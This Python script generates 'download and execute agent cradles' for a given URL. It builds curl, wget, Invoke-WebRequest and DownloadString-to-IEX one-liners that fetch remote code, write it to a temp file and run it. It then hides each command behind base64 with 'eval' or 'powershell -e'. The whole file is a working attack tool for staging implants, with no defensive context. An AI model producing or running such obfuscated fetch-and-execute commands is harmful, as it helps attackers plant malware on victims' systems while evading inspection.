import argparse
import base64

arg_parser = argparse.ArgumentParser(description='Generate download and execute agent cradle')
arg_parser.add_argument('-u', '--url', required=True, help='Download URL')
arg_parser.add_argument('-m', '--method', required=True, help='Download method (curl/wget/iwr/iex)')

args = arg_parser.parse_args()
url = args.url
download_method = args.method

if download_method == "curl":
    to_encrypt = f"a=$(mktemp);curl -s {url} -o $a;chmod +x $a;$a &"
    print(f"[*] Command:\t{to_encrypt}")
    encoded = base64.b64encode(to_encrypt.encode()).decode()
    print(f"eval $(echo {encoded}|base64 -d)")  

elif download_method == "wget":
    to_encrypt = f"a=$(mktemp);wget -q {url} -O $a;chmod +x $a;$a &"
    print(f"[*] Command:\t{to_encrypt}")
    encoded = base64.b64encode(to_encrypt.encode()).decode()
    print(f"eval $(echo {encoded}|base64 -d)")

elif download_method == "iwr":
    to_encrypt = f'iwr -uri {url} -UseBasicParsing -outfile ($x=[IO.Path]::GetTempFileName()+".exe"); & $x'
    print(f"[*] Command:\t{to_encrypt}")
    encoded = base64.b64encode(to_encrypt.encode('utf-16le')).decode('utf-8')
    print(f"powershell -e {encoded}")

elif download_method == "iex":
    to_encrypt = f"(New-Object System.Net.WebClient).DownloadString('{url}') | IEX"
    print(f"[*] Command:\t{to_encrypt}")
    encoded = base64.b64encode(to_encrypt.encode('utf-16le')).decode('utf-8')
    print(f"powershell -e {encoded}")
else:
    print("[-] Invalid method.")

